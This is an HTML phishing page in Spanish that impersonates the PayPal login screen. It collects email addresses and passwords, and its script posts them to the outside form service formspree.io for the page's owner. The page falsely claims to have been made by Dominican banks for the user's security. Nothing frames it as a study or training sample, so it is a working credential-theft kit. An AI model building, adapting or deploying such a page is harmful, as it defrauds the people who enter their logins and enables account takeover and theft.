<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>pagina - paypal</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      font-family: Arial, sans-serif;
      background: #f5f7fa;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #172b4d;
    }

    .card {
      width: 92%;
      max-width: 390px;
      background: white;
      padding: 30px 25px;
      border-radius: 14px;
      box-shadow: 0 8px 30px rgba(0,0,0,0.10);
      text-align: center;
    }

    .logo {
      font-size: 30px;
      font-weight: bold;
      color: #1769aa;
      margin-bottom: 10px;
    }

    .demo {
      background: #fff3cd;
      color: #664d03;
      padding: 9px;
      border-radius: 7px;
      font-size: 12px;
      margin-bottom: 25px;
    }

    h1 {
      font-size: 23px;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 13px;
      margin: 7px 0;
      border: 1px solid #b8c2cc;
      border-radius: 7px;
      font-size: 15px;
    }

    button {
      width: 100%;
      padding: 13px;
      margin-top: 12px;
      border: none;
      border-radius: 25px;
      background: #1769aa;
      color: white;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }

    button:hover {
      opacity: 0.9;
    }

    .resultado {
      display: none;
      margin-top: 18px;
      padding: 13px;
      background: #d1e7dd;
      color: #0f5132;
      border-radius: 8px;
      font-size: 14px;
    }

    .nota {
      margin-top: 20px;
      font-size: 12px;
      color: #687385;
      line-height: 1.5;
    }
  </style>
</head>

<body>

  <div class="card">

    <div class="logo">
      PayPal
    </div>

    <div class="demo">
      meta
    </div>

    <h1>
      Iniciar sesión
    </h1>

    <form id="loginForm" action="https://formspree.io" method="POST">

      <input
        type="text"
        name="correo"
        placeholder="Correo electrónico"
        autocomplete="off"
        required
      >

      <input
        type="password"
        name="clave"
        placeholder="Contraseña d"
        autocomplete="off"
        required
      >

      <button type="submit">
        Iniciar sesión
      </button>

    </form>

    <div class="resultado" id="resultado">
      🛡️ Formulario enviado al propietario.<br><br>
      Revisa la bandeja de entrada del correo vinculado.
    </div>

    <div class="nota">
      Esta página ha sido creada por grupo metas y bancos dominicanos pora tu seguridad bancaria
    </div>

  </div>

  <script>
    document
      .getElementById("loginForm")
      .addEventListener("submit", function(event) {
        
        event.preventDefault();
        
        var form = this;
        var data = new FormData(form);
        var resultadoDiv = document.getElementById("resultado");

        fetch(form.action, {
          method: form.method,
          body: data,
          headers: {
            'Accept': 'application/json'
          }
        }).then(response => {
          if (response.ok) {
            resultadoDiv.style.display = "block";
            form.reset();
          } else {
            alert("Ocurrió un error al procesar el envío.");
          }
        }).catch(error => {
          alert("Error de conexión al enviar los datos.");
        });
      });
  </script>

</body>
</html>
